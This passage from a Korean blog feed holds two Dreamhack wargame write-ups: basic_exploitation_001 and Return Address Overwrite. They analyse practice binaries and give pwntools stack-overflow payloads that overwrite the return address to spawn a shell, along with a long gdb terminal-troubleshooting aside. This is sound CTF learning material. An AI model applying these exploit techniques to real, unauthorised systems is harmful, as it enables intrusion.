&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;오케이! 이쪽으로 RET addr를 리다이렉트 해주면 되겠다&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-페이로드-작성&quot;&gt;3. 페이로드 작성&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;0x80(dump)+0x04(rbp contamination)+0x080485b9&lt;/p&gt;

&lt;p&gt;로컬 프로그램에 시도해 보았다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./basic_exploitation_001&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# context.terminal = [&quot;bash&quot;]payload=b&apos;A&apos;*0x80payload+=b&apos;B&apos;*0x4payload+= p32(0x080485b9, endian=&apos;little&apos;)
# gdb.attach(p, gdbscript=&apos;b *(main+20)&apos;)# input(&apos;1&apos;)p.sendline(payload )
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;31-에러-해결-gdbattach시-gdb가-붙지-못하는-오류&quot;&gt;3.1. 에러 해결-gdb.attach시 gdb가 붙지 못하는 오류&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;하지만 gdb.attach를 수행 시 아래와 같은 에러가 뜬다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Could&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;vscode&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;보통 이 에러가 뜨면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]&lt;/code&gt; 를 코드에 추가해 context.terminal을 명시적으로 정의하여 gdb가 돌 수 있는 터미널 응용 프로그램을 지정하라고 한다.&lt;/p&gt;

&lt;p&gt;일반적으로 이렇게 하면 해결되고… 하지만 난 해결이 안 됐다. gdb가 붙지 못하고 먼저 죽어버리는 것이었다.&lt;/p&gt;

&lt;p&gt;에러 메시지에는 ptrace의 실행 권한을 확인하라고만 나와 있었는데, 난 이미 해당 플래그를 편집해 모든 프로세스가 디버깅을 위해 ptrace를 사용 가능하도록 열어둔 상태였고 터미널의 환경 변수도 정상적으로 적용되어 있었다.&lt;/p&gt;

&lt;p&gt;그래서 &lt;a href=&quot;https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/util/misc.py&quot;&gt;에러가 뜬 소스&lt;/a&gt;를 직접 확인해 봤다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run_in_new_terminal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kill_at_exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;preexec_fn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;run_in_new_terminal(command, terminal=None, args=None, kill_at_exit=True, preexec_fn=None) -&amp;gt; int    Run a command in a new terminal.    When ``terminal`` is not set:        - If ``context.terminal`` is set it will be used.          If it is an iterable then ``context.terminal[1:]`` are default arguments.        - If a ``pwntools-terminal`` command exists in ``$PATH``, it is used        - If tmux is detected (by the presence of the ``$TMUX`` environment          variable), a new pane will be opened.        - If GNU Screen is detected (by the presence of the ``$STY`` environment          variable), a new screen will be opened.        - If ``$TERM_PROGRAM`` is set, that is used.        - If X11 is detected (by the presence of the ``$DISPLAY`` environment          variable), ``x-terminal-emulator`` is used.        - If KDE Konsole is detected (by the presence of the ``$KONSOLE_VERSION``          environment variable), a terminal will be split.        - If WSL (Windows Subsystem for Linux) is detected (by the presence of          a ``wsl.exe`` binary in the ``$PATH`` and ``/proc/sys/kernel/osrelease``          containing ``Microsoft``), a new ``cmd.exe`` window will be opened.    If `kill_at_exit` is :const:`True`, try to close the command/terminal when the    current process exits. This may not work for all terminal types.    Arguments:        command (str): The command to run.        terminal (str): Which terminal to use.        args (list): Arguments to pass to the terminal        kill_at_exit (bool): Whether to close the command/terminal on process exit.        preexec_fn (callable): Callable to invoke before exec().
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;시스템 터미널 환경에 어떤 커스텀이 적용되어 있으면, 그것을 확인해 해당 커스텀이 추가해 둔 시스템의 환경 변수를 읽어와서 새로운 터미널 프로세스를 fork할 때 exec의 커맨드로 주는 메커니즘인 것 같았다.&lt;/p&gt;

&lt;p&gt;따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printenv&lt;/code&gt; 명령어로 현재 사용자 프로파일에 정의된 환경 변수 중, 위의 설명에 언급된 것이 있는지 여부를 확인해 보았다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;vscode shell-우선순위에 따라 TERM_PROGRAM 환경변수를 우선 참조한다.&lt;/p&gt;

    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; tv@tv-virtual-machine:~/system_hacking/basic_exploitation_001.d&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PATH|TMUX|STY|TERM_PROGRAM|DISPLAY|KONSOLE_VERSION&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;declare&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;DISPLAY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;:0&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;declare&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;GNOME_SETUP_DISPLAY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;:1&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;declare&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home/tv/.local/bin:/home/tv/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/snap/bin&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;declare&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;TERM_PROGRAM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;vscode&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;declare&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;TERM_PROGRAM_VERSION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.90.2&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;declare&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;WAYLAND_DISPLAY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wayland-0&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;system shell(/etc/passwd의 마지막 필드에 정의된 사용자의 기본 쉘)-위의 설명이 나열한 것 중 DISPLAY 환경변수밖에 없어, X11(리눅스 GUI 환경)임을 탐지하고 심링크로 설정된(x-terminal-emulator는 일종의 perl 스크립트와 연결되어 users’ preferred terminal binary로 심링크를 타게 해준다) 유저 기본 터미널을 실행하게 된다.&lt;/p&gt;

    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; tv@tv-virtual-machine:~/system_hacking/basic_exploitation_001.d&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;printenv&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PATH|TMUX|STY|TERM_PROGRAM|DISPLAY|KONSOLE_VERSION&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WAYLAND_DISPLAY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;wayland-0
 &lt;span class=&quot;nv&quot;&gt;GNOME_SETUP_DISPLAY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;:1
 &lt;span class=&quot;nv&quot;&gt;DISPLAY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;:0
 &lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/tv/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/snap/bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그리고 vscode shell에서 vscode 명령어를 실행하면 아무것도 실행되지 않는다. 즉, 최초로 등장했던 아래의 오류는 vscode라는 명령어 바이너리가 없어서였던 것이다!&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Could&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;vscode&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;자… 그럼 이제 어떻게 해야 할까?&lt;/p&gt;

&lt;p&gt;저 환경변수 자체를 바꿔버리거나, vscode라는 바이너리를 /usr/bin/에 만들어서 내부 스크립트로 기본 터미널에 심링크를 걸거나(~/.profile 참조), 아니면 숨어 있는 vscode 바이너리를 찾아내서 해당 바이너리의 path를 추가하거나(find 명령어 이용)&lt;/p&gt;

&lt;p&gt;그런데 그건 vscode shell을 써야만 할 때의 이야기고&lt;/p&gt;

&lt;p&gt;나는 그냥 쉽게 시스템 기본 쉘을 썼다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;드림핵에서 가상머신 할당했는데 무슨 이유에서인지 접근이 안 돼서….&lt;/p&gt;

&lt;p&gt;로컬 파일 익스한 것만 올린다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-basic_exploitation_001/Untitled_5.png&quot; alt=&quot;/assets/img/posts/2024-12-01-basic_exploitation_001/Untitled_5.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Sun, 01 Dec 2024 01:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/dreamhack_system_hacking/2024-12-01-basic_exploitation_001</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/dreamhack_system_hacking/2024-12-01-basic_exploitation_001</guid>
      </item>
    
      <item>
        <title>Dreamhack-Return Address Overwrite 문제 풀이</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-메타데이터-분석&quot; id=&quot;markdown-toc-0-메타데이터-분석&quot;&gt;0. 메타데이터 분석&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-행위-분석&quot; id=&quot;markdown-toc-1-행위-분석&quot;&gt;1. 행위 분석&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-정적-분석&quot; id=&quot;markdown-toc-2-정적-분석&quot;&gt;2. 정적 분석&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-alias-자동-설정-스크립트&quot; id=&quot;markdown-toc-21-alias-자동-설정-스크립트&quot;&gt;2.1. alias 자동 설정 스크립트&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-main-함수-분석&quot; id=&quot;markdown-toc-22-main-함수-분석&quot;&gt;2.2. main 함수 분석&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#23-get_shell-함수-분석&quot; id=&quot;markdown-toc-23-get_shell-함수-분석&quot;&gt;2.3. get_shell 함수 분석&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-페이로드-작성&quot; id=&quot;markdown-toc-3-페이로드-작성&quot;&gt;3. 페이로드 작성&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0-메타데이터-분석&quot;&gt;0. 메타데이터 분석&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled.png&quot; alt=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ELF64&lt;/li&gt;
  &lt;li&gt;little endian&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_1.png&quot; alt=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_1.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;not stripped&lt;/li&gt;
  &lt;li&gt;C언어 라이브러리&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_2.png&quot; alt=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_2.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;NX enabled, but no canary &amp;amp; no PIE(코드 영역 고정으로 plt, got 고정)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;—&amp;gt; 가능한 익스플로잇은 Return Address Overwrite나 ROP 정도일 것&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-행위-분석&quot;&gt;1. 행위 분석&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_3.png&quot; alt=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_3.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;단순하게 Input: 을 출력하고 사용자 입력값을 받은 후 종료하는 프로그램&lt;/p&gt;

&lt;p&gt;해당 프로그램에 어떤 취약점이 존재하는지 파악해 보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-정적-분석&quot;&gt;2. 정적 분석&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;내부에 어떤 함수가 있는지부터 파악해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_4.png&quot; alt=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_4.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;main 함수가 존재하고, get_shell 함수가 존재한다. 두 함수를 요주의 함수로 두고 접근하자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;21-alias-자동-설정-스크립트&quot;&gt;2.1. alias 자동 설정 스크립트&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;disassemble을 disas로 alias 설정을 하고 싶은데, 터미널을 실행할 때마다 alias를 새로 실행해야 해서 귀찮았다. 따라서 pwndbg의 스크립트를 아래와 같이 수정해 pwndbg가 실행될 때마다 disas가 disassemble로 설정되도록 했다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Force UTF-8 encoding (to_string=True to skip output appearing to the user)command=&apos;&apos;&apos;set charset UTF-8alias disas=disassemble&apos;&apos;&apos;gdb.execute(command, to_string=True)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;22-main-함수-분석&quot;&gt;2.2. main 함수 분석&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_5.png&quot; alt=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_5.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;내부에서 get_shell을 호출하는 부분은 없다&lt;/li&gt;
  &lt;li&gt;main함수의 지역 변수는 1개로, 0x30짜리 크기를 가졌음(이하 buf)&lt;/li&gt;
  &lt;li&gt;scanf(”%s”, buf)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;scanf 함수는 길이 제한 없이 사용자 입력값을 받는 취약점이 있으므로 이를 활용할 수 있어 보인다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;23-get_shell-함수-분석&quot;&gt;2.3. get_shell 함수 분석&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_6.png&quot; alt=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_6.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_7.png&quot; alt=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_7.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;0x4006aa가 해당 함수의 시작 주소&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve(”/bin/sh”, *(rbp-0x8)*(/bin/sh문자열의 주소)*, 0)&lt;/code&gt;를 실행하는 함수&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-페이로드-작성&quot;&gt;3. 페이로드 작성&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;0x30 bytes dump + 0x08 bytes rbp dump + 0x00000000004006aa&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./rao&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;B&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x08&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4006aa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endian&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;little&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_8.png&quot; alt=&quot;/assets/img/posts/2024-12-01-Return-Address-Overwrite/Untitled_8.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Return Address Overwrite를 통해 쉘을 딸 수 있었다.&lt;/p&gt;

&lt;p&gt;이제 원격 호스트에 대해 실행은 생략한다(이미 푼 문제라 플래그 입력이 안 된다)&lt;/p&gt;
</description>
        <pubDate>Sun, 01 Dec 2024 01:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/system_hacking/2024-12-01-Return-Address-Overwrite</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/system_hacking/2024-12-01-Return-Address-Overwrite</guid>
      </item>
    
      <item>
        <title>입사 4개월 반, 근황 공유</title>
